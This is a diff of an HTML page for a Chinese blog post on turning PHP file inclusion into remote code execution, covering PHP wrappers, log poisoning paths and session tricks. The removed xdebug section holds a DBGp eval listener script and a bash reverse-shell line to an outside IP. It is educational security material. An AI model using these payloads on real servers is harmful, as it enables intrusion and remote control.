@@ -25,8 +25,6 @@
 <meta property="og:image" content="https://i.loli.net/2019/11/25/NGu9C2eUdLcIlJ1.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/25/uJ1TGDk5gzS6xMV.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/25/teGKMRy7kY5ZFo1.png">
-<meta property="og:image" content="https://i.loli.net/2019/11/25/rSz8fULRaHTwuhb.png">
-<meta property="og:image" content="https://i.loli.net/2019/11/25/jcqZrniHV1m6thQ.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/25/5f1EV6jkIMbipSK.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/25/fOVA84hX1P5BkS9.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/25/n4PDIEcRH8gf73j.png">
@@ -39,7 +37,7 @@
 <meta property="og:image" content="https://i.loli.net/2019/11/25/uBxRcHzl7IEvaUO.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/25/jHbnMwmgavV3Etz.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/25/u8ysMqotZG7EHPj.png">
-<meta property="og:updated_time" content="2019-11-25T11:10:01.953Z">
+<meta property="og:updated_time" content="2019-11-28T05:04:39.075Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="LFI to RCE思路">
 <meta name="twitter:description" content="RCE是每个代码审计的梦想！！">
@@ -221,7 +219,11 @@
 <h5 id="使用-PHP-封装器的php-filter"><a href="#使用-PHP-封装器的php-filter" class="headerlink" title="使用 PHP 封装器的php://filter"></a>使用 PHP 封装器的php://filter</h5><h5 id="使用-PHP-的input-stream"><a href="#使用-PHP-的input-stream" class="headerlink" title="使用 PHP 的input://stream"></a>使用 PHP 的input://stream</h5><blockquote>
 <p><code>allow_url_include</code> 默认环境在php5.2之后默认为off,所以说这个用法比较鸡肋,但是平时在看phpinfo的时候可以查看下这个是否开启。 </p>
 </blockquote>
-<h5 id="使用-data-text-plain-base64-command"><a href="#使用-data-text-plain-base64-command" class="headerlink" title="使用 data://text/plain;base64,command"></a>使用 data://text/plain;base64,command</h5><p>==========================================================================</p>
+<h5 id="使用-data-text-plain-base64-command"><a href="#使用-data-text-plain-base64-command" class="headerlink" title="使用 data://text/plain;base64,command"></a>使用 data://text/plain;base64,command</h5><p>=============================新增一个</p>
+<h5 id="windows可绕过allow-url-include的限制RFI"><a href="#windows可绕过allow-url-include的限制RFI" class="headerlink" title="windows可绕过allow_url_include的限制RFI"></a>windows可绕过<strong>allow_url_include</strong>的限制<strong>RFI</strong></h5><blockquote>
+<p>参考链接： <a href="https://byqiyou.github.io/2019/05/15/bypass-RFI限制的一些思路/" target="_blank" rel="noopener">https://byqiyou.github.io/2019/05/15/bypass-RFI%E9%99%90%E5%88%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/</a> </p>
+</blockquote>
+<p>==========================================================================</p>
 <h4 id="日志文件、环境文件等可控文件"><a href="#日志文件、环境文件等可控文件" class="headerlink" title="日志文件、环境文件等可控文件"></a>日志文件、环境文件等可控文件</h4><blockquote>
 <p> 文件读取漏洞路径收集：</p>
 <p><a href="https://blog.csdn.net/qq_33020901/article/details/78810035" target="_blank" rel="noopener">https://blog.csdn.net/qq_33020901/article/details/78810035</a> </p>
@@ -229,10 +231,9 @@
 <blockquote>
 <p>一般在Linux系统下通过<code>apt-get install apache2</code> 默认安装的apache 或者nginx都没有权限访问这些文件 ，但是有时候有些管理员会因为方便等问题导致权限配置错误。 🧐</p>
 </blockquote>
-<p><code>apache log</code> getshell</p>
-<p>通过发包或者<code>nc</code></p>
+<h4 id="apache-log-getshell"><a href="#apache-log-getshell" class="headerlink" title="apache log getshell"></a><code>apache log</code> getshell</h4><p>通过发包或者<code>nc</code></p>
 <blockquote>
-<p>这里为什么要用nc去访问，不用<a href="http://xxxxxx/" target="_blank" rel="noopener">http://xxxxxx/</a>&lt;?php &gt;这样的方式去访问，因为日志在存储的过程中会把符号转换成编码的形式，然后就无法产生一句话了。 </p>
+<p>这里为什么要用nc去访问，不用<code>http://xxxxxx/&lt;?php &gt;</code>这样的方式去访问，因为日志在存储的过程中会把符号转换成编码的形式，然后就无法产生一句话了。 </p>
 </blockquote>
 <p><code>web日志</code>常见的路径</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/etc/httpd/logs/acces_log</span><br><span class="line">/var/www/logs/access_log</span><br><span class="line">/var/log/apache2/access.log</span><br><span class="line">/usr/local/apache/logs/access_log</span><br><span class="line">/var/log/apache/access_log</span><br><span class="line">/var/log/httpd/access_log</span><br><span class="line">/var/log/apache/error.log</span><br></pre></td></tr></table></figure>
@@ -254,7 +255,7 @@
 <h4 id="proc-self-environ"><a href="#proc-self-environ" class="headerlink" title="/proc/self/environ"></a>/proc/self/environ</h4><blockquote>
 <p>参考链接：<a href="https://yq.aliyun.com/articles/441861" target="_blank" rel="noopener">https://yq.aliyun.com/articles/441861</a> </p>
 </blockquote>
-<p>我的ubuntu18.04的默认权限😅</p>
+<p>我的<code>ubuntu 18.04</code>的默认权限😅</p>
 <p><img src="https://i.loli.net/2019/11/25/uJ1TGDk5gzS6xMV.png" alt="Snipaste_2019-11-25_17-08-18.png"></p>
 <p>那么也暂时不复现了。。偷懒</p>
 <h4 id="var-log-mail"><a href="#var-log-mail" class="headerlink" title="/var/log/mail"></a>/var/log/mail</h4><blockquote>
@@ -263,13 +264,13 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tlpn</span><br></pre></td></tr></table></figure>
 
 <p>发现自己未开启<code>smtp</code>服务，那么也不复现了</p>
-<p>思路不难，和之前的类似，<code>SMTP日志投毒</code></p>
+<p>思路不难，和之前的类似，<code>SMTP日志投毒</code>，之前做过一题<code>ssrf</code>+<code>gopher</code></p>
 <p>类似的还有下面的</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/fd</span><br><span class="line">/var/log/vsftpd.log</span><br><span class="line">/var/log/sshd.log</span><br></pre></td></tr></table></figure>
 
 <p>=========================================================================</p>
 <p>利用<code>xdebug</code>远程调试getshell</p>
-<p><strong>这个虽然比赛LFI，但是和下面的一起看到了就也记录下</strong></p>
+<p><strong>这个虽然不是LFI，但是和下面的一起看到了就也记录下</strong></p>
 <blockquote>
 <p>参考链接：<a href="https://www.jianshu.com/p/da213759b968" target="_blank" rel="noopener">https://www.jianshu.com/p/da213759b968</a> </p>
 <p> 关于这个利用的详情可以看[rr师傅的博客](<a href="https://ricterz.me/posts/Xdebug%3A" target="_blank" rel="noopener">https://ricterz.me/posts/Xdebug%3A</a> A Tiny Attack Surface)。 但是好像加密了🙁</p>
@@ -279,24 +280,10 @@
 <p> xdebug.remote_enable = on</p>
 </blockquote>
 <p><img src="https://i.loli.net/2019/11/25/teGKMRy7kY5ZFo1.png" alt="Snipaste_2019-11-25_17-30-01.png"></p>
+<p>我发现之前其实利用p神的vulhub复现过，才想起来🤦‍♂️</p>
 <blockquote>
-<p>xdebug远程的就是利用的是DBGp协议<br>DBGp里有一些命令： </p>
-<p><code>source -i 1 -f file:///etc/passwd</code></p>
-<p><code>eval -i transaction_id -- {DATA}</code></p>
-<p><code>{DATA}</code>为 base64 过的 PHP 代码</p>
+<p>参考链接： <a href="https://github.com/glotozz/vulhub/tree/master/php/xdebug-rce" target="_blank" rel="noopener">https://github.com/glotozz/vulhub/tree/master/php/xdebug-rce</a> </p>
 </blockquote>
-<p>VPS上运行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2</span><br><span class="line">import socket</span><br><span class="line">ip_port = (&apos;0.0.0.0&apos;,9000)</span><br><span class="line">sk = socket.socket()</span><br><span class="line">sk.bind(ip_port)</span><br><span class="line">sk.listen(10)</span><br><span class="line">while True:</span><br><span class="line">    client_data = conn.recv(1024)</span><br><span class="line">    print(client_data)</span><br><span class="line">    data = raw_input(&apos;&gt;&gt; &apos;)</span><br><span class="line">    conn.sendall(&apos;eval -i 1 -- %s\x00&apos; % data.encode(&apos;base64&apos;))</span><br><span class="line">    conn.sendall(&apos;feature_get -i transaction_id -n feature_name\x00&apos;)</span><br></pre></td></tr></table></figure>
-
-<p>然后运行：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &apos;http://192.168.6.100:9000/?XDEBUG_SESSION_START&apos;</span><br></pre></td></tr></table></figure>
-
-<p>发现代码那边收到信息了， 然后输入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&apos;bash -c &quot;bash -i &gt;&amp; /dev/tcp/59.110.164.44/1234 0&lt;&amp;1 2&gt;&amp;1&quot;&apos;)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2019/11/25/rSz8fULRaHTwuhb.png" alt="Snipaste_2019-11-25_18-00-20.png"></p>
-<p><img src="https://i.loli.net/2019/11/25/jcqZrniHV1m6thQ.png" alt="Snipaste_2019-11-25_18-00-06.png"></p>
-<p><strong>但是我似乎并没有执行，这里的bHM=解码是ls，还不是很理解，到时候再看看</strong></p>
 <p>==========================================================================</p>
 <p>下面的都可以通过<code>phpinfo()</code>来获取路径，或者靠猜😁</p>
 <h4 id="利用PHP会话值执行RCE使用控制"><a href="#利用PHP会话值执行RCE使用控制" class="headerlink" title="利用PHP会话值执行RCE使用控制"></a><strong>利用PHP会话值执行RCE使用控制</strong></h4><blockquote>
@@ -543,6 +530,19 @@
             </div>
         </div>
         
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#先说说代码审计中，存在文件上传表单或者函数能写文件"><span class="toc-number">1.</span> <span class="toc-text">先说说代码审计中，存在文件上传表单或者函数能写文件</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP中的一些协议"><span class="toc-number"></span> <span class="toc-text">PHP中的一些协议</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#使用-PHP-封装器的-expect-command"><span class="toc-number">1.</span> <span class="toc-text">使用 PHP 封装器的 expect://command</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#使用-PHP-封装器的php-file"><span class="toc-number">2.</span> <span class="toc-text">使用 PHP 封装器的php://file</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#使用-PHP-封装器的php-filter"><span class="toc-number">3.</span> <span class="toc-text">使用 PHP 封装器的php://filter</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#使用-PHP-的input-stream"><span class="toc-number">4.</span> <span class="toc-text">使用 PHP 的input://stream</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#使用-data-text-plain-base64-command"><span class="toc-number">5.</span> <span class="toc-text">使用 data://text/plain;base64,command</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#windows可绕过allow-url-include的限制RFI"><span class="toc-number">6.</span> <span class="toc-text">windows可绕过allow_url_include的限制RFI</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#日志文件、环境文件等可控文件"><span class="toc-number"></span> <span class="toc-text">日志文件、环境文件等可控文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#apache-log-getshell"><span class="toc-number"></span> <span class="toc-text">apache log getshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#proc-self-environ"><span class="toc-number"></span> <span class="toc-text">/proc/self/environ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#var-log-mail"><span class="toc-number"></span> <span class="toc-text">/var/log/mail</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用PHP会话值执行RCE使用控制"><span class="toc-number"></span> <span class="toc-text">利用PHP会话值执行RCE使用控制</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#session还有另一个更加通用的思路"><span class="toc-number">1.</span> <span class="toc-text">session还有另一个更加通用的思路</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#session-LFI-getshell"><span class="toc-number"></span> <span class="toc-text">session+LFI getshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phpinfo-LFI包含临时文件getshell"><span class="toc-number"></span> <span class="toc-text">phpinfo-LFI包含临时文件getshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LFI-php7崩溃"><span class="toc-number"></span> <span class="toc-text">LFI + php7崩溃</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#参考链接："><span class="toc-number"></span> <span class="toc-text">参考链接：</span></a>
+                    </div>
+                </span>
+            </div>
+        </div>
         
     </div>
 </aside>
